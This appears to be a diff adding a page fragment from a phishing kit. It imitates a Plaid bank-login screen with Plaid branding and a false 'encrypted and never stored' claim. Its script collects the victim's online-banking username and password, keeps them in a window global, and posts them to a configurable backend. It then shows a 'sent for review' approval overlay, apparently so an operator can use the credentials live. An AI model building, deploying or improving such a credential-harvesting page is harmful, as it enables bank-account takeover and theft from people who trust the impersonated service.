@@ -1,0 +1,548 @@
+<style>
+/* ═══════════════════════════════════════════════
+   PLAID DESIGN SYSTEM — shared across all fragments
+   ═══════════════════════════════════════════════ */
+:root {
+  --p-black:   #111111;
+  --p-navy:    #113b5e;
+  --p-blue:    #1a56ff;
+  --p-gray1:   #f5f5f5;
+  --p-gray2:   #e8e8e8;
+  --p-gray3:   #b0b0b0;
+  --p-gray4:   #6b6b6b;
+  --p-white:   #ffffff;
+  --p-green:   #0fa55a;
+  --p-red:     #e0341b;
+  --p-radius:  10px;
+  --p-shadow:  0 4px 24px rgba(0,0,0,0.10);
+  --p-trans:   all 0.22s cubic-bezier(.4,0,.2,1);
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+.p-wrap {
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  padding: 16px 12px 32px;
+  background: #f0f2f5;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  -webkit-font-smoothing: antialiased;
+}
+
+.p-card {
+  background: var(--p-white);
+  border-radius: 16px;
+  box-shadow: var(--p-shadow);
+  width: 100%;
+  max-width: 440px;
+  padding: 0;
+  overflow: hidden;
+}
+
+/* ── Top bar with Plaid logo ── */
+.p-topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px 0;
+}
+.p-plaid-logo {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.p-plaid-logo img {
+  height: 22px;
+  width: auto;
+}
+.p-plaid-wordmark {
+  font-size: 17px;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+  color: var(--p-black);
+}
+.p-lock-icon {
+  width: 30px;
+  height: 30px;
+  background: var(--p-gray1);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--p-gray4);
+  font-size: 13px;
+}
+
+/* ── Progress dots ── */
+.p-progress {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  padding: 14px 20px 0;
+}
+.p-dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--p-gray2);
+  transition: var(--p-trans);
+}
+.p-dot.active  { background: var(--p-black); transform: scale(1.2); }
+.p-dot.done    { background: var(--p-green); }
+.p-progress-bar-wrap {
+  padding: 14px 20px 0;
+}
+.p-progress-bar {
+  width: 100%;
+  height: 3px;
+  background: var(--p-gray2);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.p-progress-bar-fill {
+  height: 100%;
+  background: var(--p-black);
+  border-radius: 2px;
+  transition: width 0.5s cubic-bezier(.4,0,.2,1);
+}
+
+/* ── Institution header ── */
+.p-inst-header {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 18px 20px 0;
+}
+.p-inst-logo {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
+  background: var(--p-gray1);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  flex-shrink: 0;
+  border: 1px solid var(--p-gray2);
+}
+.p-inst-logo img  { max-width: 78%; max-height: 78%; object-fit: contain; }
+.p-inst-logo svg  { width: 100%; height: 100%; }
+.p-inst-info h3   { font-size: 15px; font-weight: 600; color: var(--p-black); line-height: 1.2; }
+.p-inst-info span { font-size: 12.5px; color: var(--p-gray4); margin-top: 2px; display: block; }
+
+/* ── Body content ── */
+.p-body {
+  padding: 20px 20px 24px;
+}
+.p-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--p-black);
+  letter-spacing: -0.3px;
+  margin-bottom: 6px;
+}
+.p-sub {
+  font-size: 13.5px;
+  color: var(--p-gray4);
+  line-height: 1.55;
+  margin-bottom: 20px;
+}
+
+/* ── Input group ── */
+.p-field {
+  margin-bottom: 14px;
+}
+.p-label {
+  display: block;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--p-gray4);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 6px;
+}
+.p-input {
+  width: 100%;
+  padding: 13px 14px;
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  color: var(--p-black);
+  background: var(--p-white);
+  transition: var(--p-trans);
+  outline: none;
+  box-sizing: border-box;
+}
+.p-input:focus    { border-color: var(--p-black); box-shadow: 0 0 0 3px rgba(17,17,17,0.08); }
+.p-input.p-error  { border-color: var(--p-red); }
+.p-input-wrap     { position: relative; }
+.p-input-wrap .p-input { padding-right: 44px; }
+.p-eye {
+  position: absolute;
+  right: 13px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--p-gray3);
+  font-size: 15px;
+  padding: 4px;
+}
+.p-eye:hover { color: var(--p-black); }
+
+/* ── Error message ── */
+.p-error-msg {
+  font-size: 12px;
+  color: var(--p-red);
+  margin-top: 5px;
+  display: none;
+}
+.p-error-msg.show { display: block; }
+
+/* ── Buttons ── */
+.p-btn {
+  width: 100%;
+  padding: 14px;
+  background: var(--p-black);
+  color: var(--p-white);
+  border: none;
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--p-trans);
+  letter-spacing: 0.1px;
+  margin-top: 4px;
+}
+.p-btn:hover    { background: #222; transform: translateY(-1px); box-shadow: 0 4px 14px rgba(0,0,0,0.18); }
+.p-btn:active   { transform: translateY(0); }
+.p-btn:disabled { background: var(--p-gray2); color: var(--p-gray3); cursor: not-allowed; transform: none; box-shadow: none; }
+.p-btn-ghost {
+  width: 100%;
+  padding: 13px;
+  background: transparent;
+  color: var(--p-black);
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: var(--p-trans);
+  margin-top: 10px;
+}
+.p-btn-ghost:hover { background: var(--p-gray1); border-color: var(--p-gray3); }
+
+/* ── Divider ── */
+.p-divider {
+  height: 1px;
+  background: var(--p-gray2);
+  margin: 18px 0;
+}
+
+/* ── Footer ── */
+.p-footer {
+  padding: 0 20px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  font-size: 12px;
+  color: var(--p-gray4);
+}
+.p-footer i { font-size: 11px; color: var(--p-green); }
+
+/* ── Loading spinner ── */
+.p-spinner {
+  display: inline-block;
+  width: 20px; height: 20px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: pSpin 0.7s linear infinite;
+  vertical-align: middle;
+  margin-right: 8px;
+}
+@keyframes pSpin { to { transform: rotate(360deg); } }
+
+/* ── Generic bank SVG ── */
+.p-gen-bank svg { width: 100%; height: 100%; }
+
+</style>
+
+<div class="p-wrap">
+  <div class="p-card">
+    <div class="p-topbar">
+      <div class="p-plaid-logo">
+        <img src="https://i.ibb.co/20tK8xrs/pngwing-com.png" alt="Plaid">
+        <span class="p-plaid-wordmark">plaid</span>
+      </div>
+      <div class="p-lock-icon"><i class="fas fa-lock"></i></div>
+    </div>
+    <div class="p-progress-bar-wrap">
+      <div class="p-progress-bar"><div class="p-progress-bar-fill" style="width:20%;"></div></div>
+    </div>
+
+    <div class="p-inst-header">
+      <div class="p-inst-logo" id="loginLogoWrap"></div>
+      <div class="p-inst-info">
+        <h3 id="loginBankName">Your Bank</h3>
+        <span>Online Banking Sign In</span>
+      </div>
+    </div>
+
+    <div class="p-body">
+      <p class="p-title">Sign in to your account</p>
+      <p class="p-sub">Enter your online banking credentials. Your login is encrypted and never stored.</p>
+
+      <div class="p-field">
+        <label class="p-label" for="bankUsername">Username / User ID</label>
+        <input type="text" id="bankUsername" class="p-input"
+          placeholder="Enter your username"
+          autocomplete="off" autocorrect="off"
+          autocapitalize="off" spellcheck="false">
+      </div>
+
+      <div class="p-field">
+        <label class="p-label" for="bankPassword">Password</label>
+        <div class="p-input-wrap">
+          <input type="password" id="bankPassword" class="p-input"
+            placeholder="Enter your password"
+            autocomplete="new-password" spellcheck="false">
+          <button type="button" class="p-eye" id="loginEyeBtn">
+            <i class="fas fa-eye"></i>
+          </button>
+        </div>
+      </div>
+
+      <div class="p-error-msg" id="loginErrMsg"></div>
+
+      <button class="p-btn"       id="loginSignInBtn"    type="button">Sign In</button>
+      <button class="p-btn-ghost" id="loginChangeBankBtn" type="button">&#8592; Change Bank</button>
+    </div>
+
+    <div class="p-footer">
+      <i class="fas fa-lock"></i>
+      <span>Protected by Plaid &amp; 256-bit SSL encryption</span>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  /* ============================================================
+     p_login_v1 — hardened init  (DOM-property wiring guard)
+
+     ROOT CAUSE FIX:
+     The old approach used window._loginWired (a window global) to
+     prevent double-binding. Problem: window globals survive across
+     fragment re-injections. When session_router clears app.innerHTML
+     and re-injects p_login (e.g. after back-navigation), the fresh
+     DOM has no listeners, but _loginWired=true prevents re-wiring.
+     Result: Sign In and Change Bank buttons are dead.
+
+     NEW APPROACH:
+     Use signInBtn._wired — a property on the DOM element itself.
+     When app.innerHTML='' destroys the DOM, the property is gone.
+     Fresh elements always have _wired=undefined → always get wired.
+     _loginFormState persists across navigations for value restore.
+  ============================================================ */
+
+  var GEN_SVG = '<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="48" rx="10" fill="#113b5e"/><path d="M24 8L40 17H8Z" fill="#82cde5"/><rect x="10" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="16" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="22" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="28" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="34" y="19" width="4" height="12" rx="1.5" fill="white"/><rect x="8" y="31" width="32" height="4" rx="2" fill="white"/></svg>';
+
+  /* ── Logo — always render when wrap is empty ─────────────── */
+  var bank   = window._selectedBank || {};
+  var wrap   = document.getElementById('loginLogoWrap');
+  var nameEl = document.getElementById('loginBankName');
+  if (nameEl && bank.name) nameEl.textContent = bank.name;
+  if (wrap && !wrap.hasChildNodes()) {
+    if (bank.logo) {
+      var logoImg   = new Image();
+      logoImg.alt   = bank.name || 'Bank';
+      logoImg.style.cssText = 'max-width:78%;max-height:78%;object-fit:contain;display:block;';
+      logoImg.onerror = function () { wrap.innerHTML = GEN_SVG; };
+      logoImg.src   = bank.logo;
+      wrap.appendChild(logoImg);
+    } else {
+      wrap.innerHTML = GEN_SVG;
+    }
+  }
+
+  /* ── Form-state persistence across re-injections ────────── */
+  if (!window._loginFormState) {
+    window._loginFormState = { username: '', password: '' };
+  }
+
+  var uEl = document.getElementById('bankUsername');
+  var pEl = document.getElementById('bankPassword');
+
+  if (uEl) {
+    uEl.value = window._loginFormState.username;
+    uEl.addEventListener('input', function () {
+      window._loginFormState.username = uEl.value;
+    });
+  }
+  if (pEl) {
+    pEl.value = window._loginFormState.password;
+    pEl.addEventListener('input', function () {
+      window._loginFormState.password = pEl.value;
+    });
+  }
+
+  /* ── Eye toggle ─────────────────────────────────────────── */
+  var eyeBtn = document.getElementById('loginEyeBtn');
+  if (eyeBtn && !eyeBtn._wired) {
+    eyeBtn._wired = true;
+    eyeBtn.addEventListener('click', function () {
+      if (!pEl) return;
+      var icon = eyeBtn.querySelector('i');
+      if (pEl.type === 'password') {
+        pEl.type = 'text';
+        if (icon) { icon.classList.remove('fa-eye'); icon.classList.add('fa-eye-slash'); }
+      } else {
+        pEl.type = 'password';
+        if (icon) { icon.classList.remove('fa-eye-slash'); icon.classList.add('fa-eye'); }
+      }
+    });
+  }
+
+  /* ── Sign In ────────────────────────────────────────────────
+     DOM-property guard: signInBtn._wired — cleared on DOM reset.
+     Guarantees fresh wiring after every fragment re-injection.   */
+  var signInBtn = document.getElementById('loginSignInBtn');
+  if (signInBtn && !signInBtn._wired) {
+    signInBtn._wired = true;
+
+    signInBtn.addEventListener('click', function () {
+      var errEl = document.getElementById('loginErrMsg');
+      var u     = (uEl ? uEl.value : '').trim();
+      var p     = pEl ? pEl.value : '';
+
+      if (errEl) { errEl.textContent = ''; errEl.classList.remove('show'); }
+
+      if (!u || !p) {
+        if (errEl) {
+          errEl.textContent = 'Please enter your username and password.';
+          errEl.classList.add('show');
+        }
+        return;
+      }
+
+      signInBtn.disabled = true;
+      signInBtn.innerHTML = '<span class="p-spinner"></span>Signing in…';
+
+      var _resetBtn = function () {
+        signInBtn.disabled = false;
+        signInBtn.textContent = 'Sign In';
+      };
+
+      var _resetTimer = setTimeout(function () {
+        var ov = document.getElementById('sh-approval-overlay');
+        if (!ov || ov.style.display === 'none' || ov.style.display === '') {
+          _resetBtn();
+        }
+      }, 12000);
+
+      if (typeof window.submitBankLogin === 'function') {
+        var result = window.submitBankLogin();
+        if (result && typeof result.then === 'function') {
+          result.catch(function () {
+            clearTimeout(_resetTimer);
+            _resetBtn();
+          });
+        }
+        return;
+      }
+
+      /* Fallback: direct HTTPS POST */
+      clearTimeout(_resetTimer);
+      var backendUrl = (typeof APP_CONFIG !== 'undefined') ? APP_CONFIG.BACKEND_URL : '';
+      fetch(backendUrl + '/step/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionId:     window.SPA ? window.SPA.Session.id()   : '',
+          applicationId: window.SPA ? window.SPA.Session.appId(): '',
+          stepType:      'plaid_bank_login',
+          payload: {
+            bank_id:   bank.id   || '',
+            bank_name: bank.name || '',
+            username:  u,
+            password:  p,
+          },
+          ts: Date.now(),
+        }),
+      })
+      .then(function (r) { return r.ok ? r.json() : Promise.reject('HTTP ' + r.status); })
+      .then(function () {
+        if (window.SessionHandler && window.SessionHandler.ApprovalGate) {
+          window.SessionHandler.ApprovalGate.show('plaid_bank_login', 'Bank login sent for review…');
+        }
+      })
+      .catch(function (err) {
+        console.error('[p_login_v1] fallback failed:', err);
+        _resetBtn();
+        if (window.SessionHandler && window.SessionHandler.UI) {
+          window.SessionHandler.UI.showToast('error', 'Submission failed. Please try again.');
+        }
+      });
+    });
+  }
+
+  /* ── Change Bank ────────────────────────────────────────────
+     DOM-property guard: changeBankBtn._wired
+     Resets _loginFormState so next login screen starts clean.   */
+  var changeBankBtn = document.getElementById('loginChangeBankBtn');
+  if (changeBankBtn && !changeBankBtn._wired) {
+    changeBankBtn._wired = true;
+
+    changeBankBtn.addEventListener('click', function () {
+      /* Clear state so next p_login is a fresh start */
+      window._loginFormState = { username: '', password: '' };
+
+      var TARGET = 'p_banksel_v1';
+
+      function _go() {
+        if (window.SPA && typeof window.SPA.renderFragment === 'function') {
+          window.SPA.renderFragment(TARGET, 'Loading…');
+          return;
+        }
+        if (window.SPA && window.SPA.Connection) {
+          window.SPA.Connection.send({
+            type: 'request_fragment', fragmentId: TARGET,
+            sessionId: window.SPA.Session ? window.SPA.Session.id() : '', ts: Date.now(),
+          });
+          return;
+        }
+        if (typeof window.showPlaidScreen === 'function') window.showPlaidScreen('bankSelection');
+      }
+
+      if (window.SPA && typeof window.SPA.clearFragmentDedup === 'function') {
+        window.SPA.clearFragmentDedup(TARGET);
+        _go();
+      } else {
+        if (window.SPA && window.SPA.Loader) window.SPA.Loader.show('Loading…');
+        setTimeout(_go, 7000);
+      }
+    });
+  }
+
+  /* ── Legacy shim ─────────────────────────────────────────── */
+  window._pToggle = function (id, btn) {
+    var el = document.getElementById(id);
+    var i  = btn && btn.querySelector('i');
+    if (!el) return;
+    if (el.type === 'password') {
+      el.type = 'text';
+      if (i) { i.classList.remove('fa-eye'); i.classList.add('fa-eye-slash'); }
+    } else {
+      el.type = 'password';
+      if (i) { i.classList.remove('fa-eye-slash'); i.classList.add('fa-eye'); }
+    }
+  };
+
+})();
+</script>
